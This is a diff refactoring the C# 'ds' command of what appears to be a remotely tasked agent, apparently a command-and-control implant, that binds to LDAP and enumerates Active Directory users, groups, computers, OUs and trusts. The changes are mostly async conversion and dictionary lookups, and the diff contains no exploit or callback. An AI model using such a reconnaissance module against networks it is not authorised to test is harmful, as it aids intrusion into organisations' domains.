@@ -25,26 +25,24 @@ namespace Agent
         public async Task Execute(ServerJob job)
         {
             DsArgs args = JsonSerializer.Deserialize<DsArgs>(job.task.parameters);
-            string action = args.action;
+            if (args is null){
+                return;
+            }
 
-
-            switch (action.ToLower())
+            var actions = new Dictionary<string, Action>
             {
-                case "query":
-                    Query(args, job.task.id);
-                    break;
-                case "connect":
-                    Connect(args, job.task.id);
-                    break;
-                case "disconnect":
-                    Disconnect(job.task.id);
-                    break;
-                case "set":
-                    Set(args, job.task.id);
-                    break;
-                default:
-                    await messageManager.WriteLine("No valid command specified", job.task.id, true, "error");
-                    break;
+                { "query", async () => await Query(args, job.task.id) },
+                { "connect", async () => await Connect(args, job.task.id) },
+                { "disconnect", async () => await Disconnect(job.task.id) },
+                { "set", async () => await Set(args, job.task.id) }
+            };
+
+            string action = args.action;
+            if (actions.TryGetValue(action.ToLower() ?? string.Empty, out var func)){
+                func();
+            }
+            else{
+                await messageManager.WriteLine("No valid command specified", job.task.id, true, "error");
             }
         }
         static string GetBaseDN(string domain)
@@ -53,19 +51,17 @@ namespace Agent
             return string.Join(",", domainComponents.Select(component => $"DC={component}"));
         }
 
-        void Set(DsArgs args, string task_id)
+        async Task Set(DsArgs args, string task_id)
         {
-            messageManager.WriteLine("Not implemented yet!", task_id, true, "error");
+            await messageManager.WriteLine("Not implemented yet!", task_id, true, "error");
         }
 
-        void Connect(DsArgs args, string task_id)
+        async Task Connect(DsArgs args, string task_id)
         {
             LdapDirectoryIdentifier directoryIdentifier;
-
-
             if (!this.TryGetDomain(args, out domain))
             {
-                messageManager.WriteLine("Failed to identify domain, please specify using the domain switch", task_id, true, "error");
+                await messageManager.WriteLine("Failed to identify domain, please specify using the domain switch", task_id, true, "error");
                 return;
             }
 
@@ -76,11 +72,11 @@ namespace Agent
             try
             {
                 ldapConnection.Bind();
-                messageManager.WriteLine($"Successfully bound to LDAP at {domain}", task_id, true);
+                await messageManager.WriteLine($"Successfully bound to LDAP at {domain}", task_id, true);
             }
             catch (Exception e)
             {
-                messageManager.WriteLine(e.ToString(), task_id, true, "error");
+                await messageManager.WriteLine(e.ToString(), task_id, true, "error");
             }
         }
         bool TryGetDomain(DsArgs args, out string domain)
@@ -131,24 +127,27 @@ namespace Agent
             }
         }
 
-        void Disconnect(string task_id)
+        async Task Disconnect(string task_id)
         {
+            if(ldapConnection is null){
+                return;
+            }
             ldapConnection.Dispose();
-            messageManager.WriteLine("Connection Disposed", task_id, true);
+            await messageManager.WriteLine("Connection Disposed", task_id, true);
         }
 
-        void Query(DsArgs args, string task_id)
+        async Task Query(DsArgs args, string task_id)
         {
             if (ldapConnection is null)
             {
-                messageManager.WriteLine("No active LDAP connection, try running ds connect first.", task_id, true, "error");
+                await messageManager.WriteLine("No active LDAP connection, try running ds connect first.", task_id, true, "error");
+                return;
             }
 
-            StringBuilder sb = new StringBuilder();
             string searchBase;
-            string ldapFilter = "";
             string[] properties = null;
-
+            string ldapFilter = this.ConstructLdapFilter(args);
+            
             if (!string.IsNullOrEmpty(args.searchbase))
             {
                 searchBase = args.searchbase;
@@ -157,8 +156,6 @@ namespace Agent
             {
                 searchBase = GetBaseDN(domain);
             }
-
-            ldapFilter = this.ConstructLdapFilter(args);
 
 
             if (!string.IsNullOrEmpty(args.properties))
@@ -171,41 +168,28 @@ namespace Agent
                 SearchRequest request = new SearchRequest(searchBase, ldapFilter, SearchScope.Subtree, properties);
                 request.TimeLimit = TimeSpan.FromSeconds(120);
                 SearchResponse response = (SearchResponse)ldapConnection.SendRequest(request);
-                messageManager.WriteLine(JsonSerializer.Serialize(response.Entries), task_id, true);
+                await messageManager.WriteLine(JsonSerializer.Serialize(response.Entries), task_id, true);
             }
             catch (Exception e)
             {
-                messageManager.WriteLine(e.ToString(), task_id, true, "error");
+                await messageManager.WriteLine(e.ToString(), task_id, true, "error");
             }
         }
 
         private string ConstructLdapFilter(DsArgs args)
         {
-            string categoryFilter = String.Empty;
+            Dictionary<string, string> filters = new(){
+                { "user", "(samAccountType=805306368)" },
+                { "group", "(samAccountType=268435457)" },
+                { "ou","(objectCategory=organizationalUnit)" },
+                { "computer","(samAccountType=805306369)" },
+                { "*","(objectCategory=*)" },
+                { "trust", "(samAccountType=805306370)" }
+            };
 
-            // Validate and construct category filter
-            switch (args.objectcategory.ToLower())
-            {
-                case "user":
-                    categoryFilter = "(samAccountType=805306368)";
-                    break;
-                case "group":
-                    categoryFilter = "(samAccountType=268435457)";
-                    break;
-                case "ou":
-                    categoryFilter = "(objectCategory=organizationalUnit)";
-                    break;
-                case "computer":
-                    categoryFilter = "(samAccountType=805306369)";
-                    break;
-                case "*":
-                    categoryFilter = "(objectCategory=*)";
-                    break;
-                case "trust":
-                    categoryFilter = "(samAccountType=805306370)";
-                    break;
-                default:
-                    throw new ArgumentException("Invalid object category.");
+            string categoryFilter = string.Empty;
+            if(filters.ContainsKey(args.objectcategory.ToLower())){
+                categoryFilter = filters[args.objectcategory.ToLower()];
             }
 
             return string.IsNullOrEmpty(args.ldapfilter) ? categoryFilter : $"(&{categoryFilter}{args.ldapfilter})";
